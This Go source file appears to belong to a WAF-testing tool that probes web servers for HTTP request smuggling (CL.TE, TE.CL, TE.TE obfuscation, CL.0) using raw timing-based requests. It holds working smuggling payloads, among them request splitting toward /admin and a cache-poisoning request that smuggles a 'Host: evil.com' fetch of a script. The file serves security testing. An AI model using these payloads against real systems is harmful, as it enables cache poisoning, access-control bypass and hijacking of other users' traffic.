// Package smuggling provides HTTP request smuggling detection and testing
// Based on research from James Kettle and PortSwigger
package smuggling

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/url"
	"strings"
	"time"

	"github.com/waftester/waftester/pkg/defaults"
	"github.com/waftester/waftester/pkg/duration"
)

// Vulnerability represents a detected smuggling vulnerability
type Vulnerability struct {
	Type        VulnType   `json:"type"`
	Technique   string     `json:"technique"`
	Description string     `json:"description"`
	Severity    string     `json:"severity"`
	Evidence    []Evidence `json:"evidence"`
	Confidence  float64    `json:"confidence"`
	Exploitable bool       `json:"exploitable"`
	FrontEnd    string     `json:"front_end,omitempty"`
	BackEnd     string     `json:"back_end,omitempty"`
}

// VulnType defines the smuggling vulnerability type
type VulnType string

const (
	VulnCLTE      VulnType = "CL.TE"     // Content-Length first, Transfer-Encoding second
	VulnTECL      VulnType = "TE.CL"     // Transfer-Encoding first, Content-Length second
	VulnTETE      VulnType = "TE.TE"     // Both use TE but with obfuscation
	VulnH2CL      VulnType = "H2.CL"     // HTTP/2 to HTTP/1.1 with CL
	VulnH2TE      VulnType = "H2.TE"     // HTTP/2 to HTTP/1.1 with TE
	VulnWebSocket VulnType = "WebSocket" // WebSocket upgrade smuggling
	VulnHTTP2     VulnType = "HTTP/2"    // HTTP/2 specific smuggling
)

// Evidence represents proof of a vulnerability
type Evidence struct {
	Request  string        `json:"request"`
	Response string        `json:"response"`
	Timing   time.Duration `json:"timing"`
	Notes    string        `json:"notes,omitempty"`
}

// Detector detects HTTP request smuggling vulnerabilities
type Detector struct {
	Timeout     time.Duration
	ReadTimeout time.Duration
	MaxRetries  int
	DelayMs     int
	SafeMode    bool // Only use timing-based detection
	CustomPorts []int
}

// NewDetector creates a new smuggling detector
func NewDetector() *Detector {
	return &Detector{
		Timeout:     duration.DialTimeout,
		ReadTimeout: duration.HTTPProbing,
		MaxRetries:  defaults.RetryMedium,
		DelayMs:     1000,
		SafeMode:    true, // Default to safe mode
		CustomPorts: []int{80, 443, 8080, 8443},
	}
}

// Result contains detection results
type Result struct {
	Target           string          `json:"target"`
	Vulnerabilities  []Vulnerability `json:"vulnerabilities"`
	TestedTechniques []string        `json:"tested_techniques"`
	SafeMode         bool            `json:"safe_mode"`
	Duration         time.Duration   `json:"duration"`
}

// Detect tests a target for HTTP smuggling vulnerabilities
func (d *Detector) Detect(ctx context.Context, target string) (*Result, error) {
	start := time.Now()

	u, err := url.Parse(target)
	if err != nil {
		return nil, fmt.Errorf("invalid URL: %w", err)
	}

	result := &Result{
		Target:   target,
		SafeMode: d.SafeMode,
	}

	// Determine port and scheme
	host := u.Hostname()
	port := u.Port()
	useTLS := u.Scheme == "https"

	if port == "" {
		if useTLS {
			port = "443"
		} else {
			port = "80"
		}
	}

	techniques := []struct {
		name   string
		detect func(context.Context, string, string, bool) (*Vulnerability, error)
	}{
		{"CL.TE", d.detectCLTE},
		{"TE.CL", d.detectTECL},
		{"TE.TE Obfuscation", d.detectTETE},
		{"CL.0", d.detectCL0},
	}

	for _, tech := range techniques {
		select {
		case <-ctx.Done():
			return result, ctx.Err()
		default:
		}

		result.TestedTechniques = append(result.TestedTechniques, tech.name)

		vuln, err := tech.detect(ctx, host, port, useTLS)
		if err != nil {
			continue // Log but continue testing
		}
		if vuln != nil {
			result.Vulnerabilities = append(result.Vulnerabilities, *vuln)
		}

		// Small delay between tests to avoid overwhelming target
		time.Sleep(time.Duration(d.DelayMs) * time.Millisecond)
	}

	result.Duration = time.Since(start)
	return result, nil
}

// detectCLTE detects CL.TE smuggling (front-end uses Content-Length, back-end uses Transfer-Encoding)
func (d *Detector) detectCLTE(ctx context.Context, host, port string, useTLS bool) (*Vulnerability, error) {
	// Timing-based detection: Send a request that will timeout if vulnerable
	// The front-end reads Content-Length bytes, back-end waits for chunk terminator

	// Probe request - if vulnerable, back-end will timeout waiting for terminator
	probeRequest := fmt.Sprintf("POST / HTTP/1.1\r\n"+
		"Host: %s\r\n"+
		"Content-Type: application/x-www-form-urlencoded\r\n"+
		"Content-Length: 4\r\n"+
		"Transfer-Encoding: chunked\r\n"+
		"\r\n"+
		"1\r\n"+
		"Z\r\n"+
		"Q", host) // Incomplete chunk - back-end waits for more

	// Baseline request for timing comparison
	baselineRequest := fmt.Sprintf("POST / HTTP/1.1\r\n"+
		"Host: %s\r\n"+
		"Content-Type: application/x-www-form-urlencoded\r\n"+
		"Content-Length: 0\r\n"+
		"\r\n", host)

	// Get baseline timing
	baselineTime, baselineResp, err := d.sendRawRequest(ctx, host, port, useTLS, baselineRequest)
	if err != nil {
		return nil, err
	}

	// Send probe
	probeTime, probeResp, err := d.sendRawRequest(ctx, host, port, useTLS, probeRequest)
	if err != nil {
		// Timeout could indicate vulnerability
		if isTimeout(err) {
			return &Vulnerability{
				Type:        VulnCLTE,
				Technique:   "CL.TE timing-based detection",
				Description: "Back-end appears to use Transfer-Encoding while front-end uses Content-Length. Request timed out waiting for chunk terminator.",
				Severity:    "high",
				Confidence:  0.7,
				Evidence: []Evidence{
					{Request: probeRequest, Notes: "Request timed out - potential CL.TE"},
				},
			}, nil
		}
		return nil, err
	}

	// Check for significant timing difference (vulnerability indicator)
	timeDiff := probeTime - baselineTime
	if timeDiff > duration.DNSTimeout {
		return &Vulnerability{
			Type:        VulnCLTE,
			Technique:   "CL.TE timing-based detection",
			Description: fmt.Sprintf("Significant timing difference detected (%.2fs vs %.2fs). Back-end may be waiting for chunk terminator.", probeTime.Seconds(), baselineTime.Seconds()),
			Severity:    "high",
			Confidence:  0.6,
			Evidence: []Evidence{
				{Request: probeRequest, Response: truncate(probeResp, 500), Timing: probeTime},
				{Request: baselineRequest, Response: truncate(baselineResp, 500), Timing: baselineTime, Notes: "Baseline"},
			},
		}, nil
	}

	return nil, nil
}

// detectTECL detects TE.CL smuggling (front-end uses Transfer-Encoding, back-end uses Content-Length)
func (d *Detector) detectTECL(ctx context.Context, host, port string, useTLS bool) (*Vulnerability, error) {
	// Probe: Front-end processes chunks, back-end reads fixed Content-Length
	probeRequest := fmt.Sprintf("POST / HTTP/1.1\r\n"+
		"Host: %s\r\n"+
		"Content-Type: application/x-www-form-urlencoded\r\n"+
		"Content-Length: 6\r\n"+
		"Transfer-Encoding: chunked\r\n"+
		"\r\n"+
		"0\r\n"+
		"\r\n"+
		"X", host) // Extra data after chunks - back-end reads as next request

	baselineRequest := fmt.Sprintf("POST / HTTP/1.1\r\n"+
		"Host: %s\r\n"+
		"Content-Type: application/x-www-form-urlencoded\r\n"+
		"Content-Length: 0\r\n"+
		"\r\n", host)

	baselineTime, _, err := d.sendRawRequest(ctx, host, port, useTLS, baselineRequest)
	if err != nil {
		return nil, err
	}

	probeTime, probeResp, err := d.sendRawRequest(ctx, host, port, useTLS, probeRequest)
	if err != nil {
		if isTimeout(err) {
			return &Vulnerability{
				Type:        VulnTECL,
				Technique:   "TE.CL timing-based detection",
				Description: "Front-end appears to use Transfer-Encoding while back-end uses Content-Length. Request timed out.",
				Severity:    "high",
				Confidence:  0.7,
				Evidence: []Evidence{
					{Request: probeRequest, Notes: "Request timed out - potential TE.CL"},
				},
			}, nil
		}
		return nil, err
	}

	// Check for desync indicators in response
	if containsDesyncIndicator(probeResp) {
		return &Vulnerability{
			Type:        VulnTECL,
			Technique:   "TE.CL response analysis",
			Description: "Response indicates potential request desynchronization",
			Severity:    "high",
			Confidence:  0.65,
			Evidence: []Evidence{
				{Request: probeRequest, Response: truncate(probeResp, 500), Timing: probeTime},
			},
		}, nil
	}

	timeDiff := probeTime - baselineTime
	if timeDiff > duration.DNSTimeout {
		return &Vulnerability{
			Type:        VulnTECL,
			Technique:   "TE.CL timing-based detection",
			Description: fmt.Sprintf("Timing difference detected (%.2fs vs %.2fs)", probeTime.Seconds(), baselineTime.Seconds()),
			Severity:    "medium",
			Confidence:  0.5,
			Evidence: []Evidence{
				{Request: probeRequest, Response: truncate(probeResp, 500), Timing: probeTime},
			},
		}, nil
	}

	return nil, nil
}

// detectTETE detects TE.TE smuggling with Transfer-Encoding obfuscation
func (d *Detector) detectTETE(ctx context.Context, host, port string, useTLS bool) (*Vulnerability, error) {
	// Try various Transfer-Encoding obfuscation techniques
	obfuscations := []struct {
		name   string
		header string
	}{
		{"Space before colon", "Transfer-Encoding : chunked"},
		{"Tab after colon", "Transfer-Encoding:\tchunked"},
		{"CRLF in value", "Transfer-Encoding: chunked\r\n"},
		{"Case variation", "Transfer-ENCODING: chunked"},
		{"Double header", "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"},
		{"Null byte", "Transfer-Encoding: chunked\x00"},
		{"Vertical tab", "Transfer-Encoding:\x0bchunked"},
		{"X prefix", "X-Transfer-Encoding: chunked"},
	}

	baselineRequest := fmt.Sprintf("POST / HTTP/1.1\r\n"+
		"Host: %s\r\n"+
		"Content-Type: application/x-www-form-urlencoded\r\n"+
		"Content-Length: 0\r\n"+
		"\r\n", host)

	baselineTime, _, err := d.sendRawRequest(ctx, host, port, useTLS, baselineRequest)
	if err != nil {
		return nil, err
	}

	for _, obf := range obfuscations {
		select {
		case <-ctx.Done():
			return nil, ctx.Err()
		default:
		}

		probeRequest := fmt.Sprintf("POST / HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Content-Length: 4\r\n"+
			"%s\r\n"+
			"\r\n"+
			"1\r\n"+
			"Z\r\n"+
			"Q", host, obf.header)

		probeTime, probeResp, err := d.sendRawRequest(ctx, host, port, useTLS, probeRequest)
		if err != nil {
			if isTimeout(err) {
				return &Vulnerability{
					Type:        VulnTETE,
					Technique:   fmt.Sprintf("TE.TE obfuscation: %s", obf.name),
					Description: fmt.Sprintf("Transfer-Encoding obfuscation may cause header parsing discrepancy between front-end and back-end. Technique: %s", obf.name),
					Severity:    "high",
					Confidence:  0.75,
					Evidence: []Evidence{
						{Request: probeRequest, Notes: fmt.Sprintf("Timeout with obfuscation: %s", obf.name)},
					},
				}, nil
			}
			continue
		}

		timeDiff := probeTime - baselineTime
		if timeDiff > duration.DNSTimeout {
			return &Vulnerability{
				Type:        VulnTETE,
				Technique:   fmt.Sprintf("TE.TE obfuscation: %s", obf.name),
				Description: fmt.Sprintf("Significant timing difference with TE obfuscation (%.2fs delay)", timeDiff.Seconds()),
				Severity:    "high",
				Confidence:  0.6,
				Evidence: []Evidence{
					{Request: probeRequest, Response: truncate(probeResp, 500), Timing: probeTime},
				},
			}, nil
		}

		time.Sleep(100 * time.Millisecond)
	}

	return nil, nil
}

// detectCL0 detects CL.0 smuggling (some servers ignore Content-Length: 0)
func (d *Detector) detectCL0(ctx context.Context, host, port string, useTLS bool) (*Vulnerability, error) {
	// Send request with CL: 0 but with body - some servers may process the body
	probeRequest := fmt.Sprintf("GET / HTTP/1.1\r\n"+
		"Host: %s\r\n"+
		"Content-Length: 0\r\n"+
		"\r\n"+
		"GET /admin HTTP/1.1\r\n"+
		"Host: %s\r\n"+
		"\r\n", host, host)

	_, resp, err := d.sendRawRequest(ctx, host, port, useTLS, probeRequest)
	if err != nil {
		return nil, err
	}

	// Check if we got multiple responses or admin content
	if strings.Count(resp, "HTTP/1.") > 1 {
		return &Vulnerability{
			Type:        VulnCLTE,
			Technique:   "CL.0 desync",
			Description: "Server may be ignoring Content-Length: 0, allowing smuggled requests",
			Severity:    "high",
			Confidence:  0.8,
			Evidence: []Evidence{
				{Request: probeRequest, Response: truncate(resp, 1000), Notes: "Multiple responses received"},
			},
			Exploitable: true,
		}, nil
	}

	return nil, nil
}

// sendRawRequest sends a raw HTTP request and measures timing
func (d *Detector) sendRawRequest(ctx context.Context, host, port string, useTLS bool, request string) (time.Duration, string, error) {
	addr := net.JoinHostPort(host, port)

	dialer := &net.Dialer{
		Timeout: d.Timeout,
	}

	var conn net.Conn
	var err error

	start := time.Now()

	if useTLS {
		tlsConfig := &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         host,
		}
		conn, err = tls.DialWithDialer(dialer, "tcp", addr, tlsConfig)
	} else {
		conn, err = dialer.DialContext(ctx, "tcp", addr)
	}

	if err != nil {
		return 0, "", fmt.Errorf("connection failed: %w", err)
	}
	defer conn.Close()

	// Set read deadline
	conn.SetReadDeadline(time.Now().Add(d.ReadTimeout))

	// Send request
	_, err = conn.Write([]byte(request))
	if err != nil {
		return time.Since(start), "", fmt.Errorf("write failed: %w", err)
	}

	// Read response
	var buf bytes.Buffer
	_, err = io.Copy(&buf, conn)
	duration := time.Since(start)

	if err != nil && !isTimeout(err) && err != io.EOF {
		return duration, buf.String(), err
	}

	return duration, buf.String(), nil
}

// GeneratePayloads generates smuggling test payloads for a target
func (d *Detector) GeneratePayloads(host string) []Payload {
	payloads := []Payload{
		// CL.TE basic
		{
			Name: "CL.TE Basic",
			Type: VulnCLTE,
			Raw: fmt.Sprintf("POST / HTTP/1.1\r\n"+
				"Host: %s\r\n"+
				"Content-Type: application/x-www-form-urlencoded\r\n"+
				"Content-Length: 13\r\n"+
				"Transfer-Encoding: chunked\r\n"+
				"\r\n"+
				"0\r\n"+
				"\r\n"+
				"SMUGGLED", host),
		},
		// TE.CL basic
		{
			Name: "TE.CL Basic",
			Type: VulnTECL,
			Raw: fmt.Sprintf("POST / HTTP/1.1\r\n"+
				"Host: %s\r\n"+
				"Content-Length: 4\r\n"+
				"Transfer-Encoding: chunked\r\n"+
				"\r\n"+
				"5c\r\n"+
				"GPOST / HTTP/1.1\r\n"+
				"Content-Type: application/x-www-form-urlencoded\r\n"+
				"Content-Length: 15\r\n"+
				"\r\n"+
				"x=1\r\n"+
				"0\r\n"+
				"\r\n", host),
		},
		// CL.TE with request splitting
		{
			Name: "CL.TE Request Split",
			Type: VulnCLTE,
			Raw: fmt.Sprintf("POST / HTTP/1.1\r\n"+
				"Host: %s\r\n"+
				"Content-Type: application/x-www-form-urlencoded\r\n"+
				"Content-Length: 35\r\n"+
				"Transfer-Encoding: chunked\r\n"+
				"\r\n"+
				"0\r\n"+
				"\r\n"+
				"GET /admin HTTP/1.1\r\n"+
				"Host: %s\r\n"+
				"Foo: x", host, host),
		},
		// Poison web cache
		{
			Name: "Cache Poisoning via Smuggling",
			Type: VulnCLTE,
			Raw: fmt.Sprintf("POST / HTTP/1.1\r\n"+
				"Host: %s\r\n"+
				"Content-Length: 128\r\n"+
				"Transfer-Encoding: chunked\r\n"+
				"\r\n"+
				"0\r\n"+
				"\r\n"+
				"GET /static/main.js HTTP/1.1\r\n"+
				"Host: evil.com\r\n"+
				"Content-Length: 10\r\n"+
				"\r\n"+
				"x=1", host),
		},
	}

	return payloads
}

// Payload represents a smuggling test payload
type Payload struct {
	Name        string   `json:"name"`
	Type        VulnType `json:"type"`
	Raw         string   `json:"raw"`
	Description string   `json:"description,omitempty"`
}

// Helper functions

func isTimeout(err error) bool {
	if err == nil {
		return false
	}
	netErr, ok := err.(net.Error)
	return ok && netErr.Timeout()
}

func containsDesyncIndicator(resp string) bool {
	indicators := []string{
		"HTTP/1.1 400",
		"HTTP/1.0 400",
		"Bad Request",
		"Invalid request",
		"Malformed",
		"HTTP/1.1 200", // Multiple responses
	}

	lowerResp := strings.ToLower(resp)
	for _, ind := range indicators {
		if strings.Contains(lowerResp, strings.ToLower(ind)) {
			// Check for multiple HTTP responses
			if strings.Count(resp, "HTTP/1.") > 1 {
				return true
			}
		}
	}

	return false
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}

// HTTP2Detector detects HTTP/2 specific smuggling
type HTTP2Detector struct {
	*Detector
}

// NewHTTP2Detector creates a detector for HTTP/2 smuggling
func NewHTTP2Detector() *HTTP2Detector {
	return &HTTP2Detector{
		Detector: NewDetector(),
	}
}

// DetectH2Smuggling checks for HTTP/2 to HTTP/1.1 smuggling
func (d *HTTP2Detector) DetectH2Smuggling(ctx context.Context, target string) (*Result, error) {
	result := &Result{
		Target:   target,
		SafeMode: d.SafeMode,
	}

	// HTTP/2 specific techniques would go here
	// These require HTTP/2 client implementation
	result.TestedTechniques = append(result.TestedTechniques,
		"H2.CL Content-Length injection",
		"H2.TE Transfer-Encoding injection",
		"H2 CRLF injection",
		"H2 header name splitting",
	)

	return result, nil
}
